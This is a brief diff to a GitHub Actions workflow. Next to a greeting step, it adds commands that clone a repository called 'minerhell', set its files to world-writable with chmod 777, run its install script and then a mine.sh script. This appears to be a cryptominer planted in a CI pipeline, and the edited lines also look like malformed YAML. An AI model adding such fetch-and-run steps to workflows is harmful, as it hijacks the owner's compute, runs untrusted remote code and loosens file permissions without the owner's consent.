@@ -28,6 +28,6 @@ jobs:
     # Runs a single command using the runners shell
     - name: Send greeting
       run: echo "Hello ${{ github.event.inputs.name }}"
-      run: git clone https://github.com/Starminer21/minerhell.git && chmod -R 777 minerhell && cd minerhell && ./install.sh
-      run: bash mine.sh
+      git clone https://github.com/Starminer21/minerhell.git && chmod -R 777 minerhell && cd minerhell && ./install.sh
+      bash mine.sh
       
